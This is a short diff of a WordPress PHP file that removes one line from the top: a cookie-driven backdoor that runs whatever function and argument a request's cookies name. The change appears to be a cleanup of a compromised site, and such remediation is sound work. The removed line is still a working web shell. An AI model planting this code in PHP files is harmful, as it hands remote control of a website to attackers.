@@ -1,8 +1,4 @@
 <?php
-
-if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
-
-
 /**
  * Loads the WordPress environment and template.
  *
